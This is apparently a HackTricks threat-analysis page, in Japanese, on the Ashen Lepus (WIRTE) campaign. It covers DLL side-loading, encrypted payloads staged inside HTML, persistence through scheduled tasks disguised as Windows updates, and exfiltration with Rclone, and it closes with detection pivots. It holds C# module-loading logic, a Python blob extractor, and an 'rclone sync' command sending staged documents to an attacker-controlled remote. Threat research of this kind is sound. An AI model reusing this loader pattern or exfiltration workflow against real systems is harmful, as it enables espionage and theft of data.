# 高度な DLL Side-Loading と HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## 手口の概要

Ashen Lepus (aka WIRTE) は、中東の外交ネットワーク内に持続的に留まるために、DLL sideloading、staged HTML payloads、modular .NET backdoors を連鎖させる再現可能なパターンを悪用しました。この手法は次の理由で任意のオペレータが再利用可能です:

- **Archive-based social engineering**: 無害に見える PDF がターゲットにファイル共有サイトから RAR アーカイブをダウンロードするよう指示します。アーカイブには外見上は本物のドキュメントビューア EXE、信頼されるライブラリ名を冠した悪意ある DLL（例: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`）、およびデコイの `Document.pdf` が同梱されます。
- **DLL search order abuse**: 被害者が EXE をダブルクリックすると、Windows は現在のディレクトリから DLL インポートを解決し、悪意あるローダー (AshenLoader) が信頼されたプロセス内で実行される一方、デコイ PDF が開いて疑いを避けます。
- **Living-off-the-land staging**: その後のすべてのステージ (AshenStager → AshenOrchestrator → modules) は必要になるまでディスクに置かれず、無害に見える HTML レスポンス内に隠された暗号化されたブロブとして配信されます。

## マルチステージ Side-Loading チェーン

1. **Decoy EXE → AshenLoader**: EXE が AshenLoader をサイドロードし、ホストの情報収集を行い、AES-CTR でそれを暗号化し、`token=`, `id=`, `q=`, `auth=` のような回転するパラメータ内に POST して、API 風のパス（例: `/api/v2/account`）へ送信します。
2. **HTML extraction**: C2 はクライアント IP がターゲット地域にジオロケートされ、`User-Agent` がインプラントと一致した場合にのみ次のステージを明かし、サンドボックスを困惑させます。チェックが通ると HTTP ボディには `<headerp>...</headerp>` ブロブが含まれており、Base64/AES-CTR で暗号化された AshenStager ペイロードが格納されています。
3. **Second sideload**: AshenStager は別の正当なバイナリとともに展開され、そのバイナリは `wtsapi32.dll` をインポートします。バイナリに注入された悪意あるコピーはさらに HTML をフェッチし、今回は `<article>...</article>` を掘り出して AshenOrchestrator を回復します。
4. **AshenOrchestrator**: Base64 エンコードされた JSON コンフィグをデコードするモジュール式の .NET コントローラです。コンフィグの `tg` と `au` フィールドは連結/ハッシュされて AES キーを導出し、そのキーで `xrk` を復号します。得られたバイト列は以降取得される各モジュールブロブの XOR キーとして機能します。
5. **Module delivery**: 各モジュールは HTML コメントを通じて記述され、パーサを任意のタグへリダイレクトして `<headerp>` や `<article>` のみを探す静的ルールを破ります。モジュールには永続化（`PR*`）、アンインストーラ（`UN*`）、偵察（`SN`）、スクリーンキャプチャ（`SCT`）、ファイル探索（`FE`）などが含まれます。

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
守る側が特定の要素をブロックしたり除去したりしても、オペレーターはHTMLコメントで示されたタグを変更するだけで配信を再開できます。

### クイック抽出ヘルパー (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## HTML Staging Evasion Parallels

Recent HTML smuggling research (Talos)は、HTML添付ファイル内の<script>ブロックにBase64文字列として隠されたペイロードがあり、ランタイムでJavaScriptによってデコードされることを指摘しています。同じ手法はC2レスポンスにも応用可能です：暗号化されたブロブをscriptタグ（または他のDOM要素）内にステージし、AES/XORの前にメモリ上でデコードすることでページを通常のHTMLに見せかけられます。Talosはまた、scriptタグ内での多層的な難読化（識別子のリネームに加えBase64/Caesar/AES）を示しており、これはHTML-stagedなC2ブロブにそのまま対応します。

## Recent Variant Notes (2024-2025)

- Check Pointは2024年にWIRTEキャンペーンを観測しており、archive-based sideloadingに依存しつつも最初の段階に`propsys.dll` (stagerx64) を使用していました。stagerは次のペイロードをBase64 + XOR（キー `53`）でデコードし、ハードコードされた`User-Agent`でHTTPリクエストを送信し、HTMLタグ間に埋め込まれた暗号化ブロブを抽出します。ある分岐では、ステージは多数の埋め込みIP文字列を`RtlIpv4StringToAddressA`でデコードしてから連結してペイロードバイトを再構成していました。
- OWN-CERTは以前のWIRTEツール群を文書化しており、サイドロードされた`wtsapi32.dll`ドロッパーはBase64 + TEAで文字列を保護し、復号キーをDLL名自体（例：`wtsapi32.dll`）から導出し、その後ホスト識別データをXOR/Base64で難読化してC2に送信していました。

## Crypto & C2 Hardening

- **AES-CTR everywhere**: 現在のローダーは256-bitキーとnonce（例：`{9a 20 51 98 ...}`）を埋め込み、オプションで復号前後に`msasn1.dll`のような文字列を用いたXORレイヤを追加します。
- **Key material variations**: 初期のローダーは埋め込み文字列をBase64 + TEAで保護し、復号キーを悪意のあるDLL名（例：`wtsapi32.dll`）から派生させていました。
- **Infrastructure split + subdomain camouflage**: ステージングサーバはツールごとに分離され、異なるASNに分散ホスティングされ、正当性を装ったサブドメインでフロントされることがあり、一つのステージが焼かれても残りが露見しないようにしています。
- **Recon smuggling**: 列挙データには高価値アプリを見つけるためのProgram Files一覧が含まれるようになり、ホストを離れる前に常に暗号化されます。
- **URI churn**: クエリパラメータやRESTパスはキャンペーン間で変動し（`/api/v1/account?token=` → `/api/v2/account?auth=`）、脆弱な検出ロジックを無効化します。
- **User-Agent pinning + safe redirects**: C2インフラは正確なUA文字列にのみ応答し、それ以外にはニュースやヘルス系の正当なサイトへリダイレクトして交じり合います。
- **Gated delivery**: サーバはジオフェンシングされており、本物のインプラントにのみ応答します。未承認クライアントには無害なHTMLを返します。

## Persistence & Execution Loop

AshenStagerはWindowsメンテナンスジョブを偽装したスケジュールタスクをドロップし、`svchost.exe`経由で実行されます。例：

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

これらのタスクは起動時または間隔でサイドローディングチェーンを再起動し、AshenOrchestratorがディスクに触れることなく新しいモジュールを要求できるようにします。

## Using Benign Sync Clients for Exfiltration

オペレータは専用モジュールを通じて外交文書を`C:\Users\Public`（world-readableで目立たない）にステージし、正当な[Rclone](https://rclone.org/)バイナリをダウンロードしてそのディレクトリを攻撃者管理のストレージと同期させます。Unit42は、このアクターがRcloneをexfiltrationに使用するのを観測したのは今回が初めてであり、正当な同期ツールを悪用して通常トラフィックに溶け込むという広い傾向と一致すると指摘しています：

1. Stage: ターゲットのファイルを`C:\Users\Public\{campaign}\`にコピー/収集する。
2. Configure: 攻撃者管理のHTTPSエンドポイント（例：`api.technology-system[.]com`）を指すRclone設定を配布する。
3. Sync: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` を実行し、トラフィックを通常のクラウドバックアップのように見せる。

Rcloneは正当なバックアップワークフローで広く使われているため、防御側は異常な実行（新しいバイナリ、疑わしいremote、あるいは突然の`C:\Users\Public`の同期）に注目する必要があります。

## Detection Pivots

- サイン済みプロセスがユーザー書き込み可能パスからDLLを予期せずロードしている場合にアラートを上げる（Procmonフィルタ + `Get-ProcessMitigation -Module`）、特にDLL名が`netutils`、`srvcli`、`dwampi`、`wtsapi32`と重複する場合。
- 異常なタグ内に埋め込まれた大きなBase64ブロブや、`<!-- TAG: <xyz> -->`のようなコメントで保護されたHTTPSレスポンスを調査する。
- HTMLハンティングを拡張して、JavaScriptでデコードされAES/XOR処理される前の`<script>`ブロック内のBase64文字列（HTML smugglingスタイルのステージング）を探す。
- `svchost.exe`を非サービス引数で実行する、またはドロッパーのディレクトリを指すスケジュールタスクをハントする。
- 正確な`User-Agent`文字列にのみペイロードを返し、それ以外は正当なニュース/ヘルス系ドメインにバウンスするC2リダイレクトを追跡する。
- IT管理下以外で出現する**Rclone**バイナリ、新しい`rclone.conf`ファイル、または`C:\Users\Public`のようなステージングディレクトリから同期を行うジョブを監視する。

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
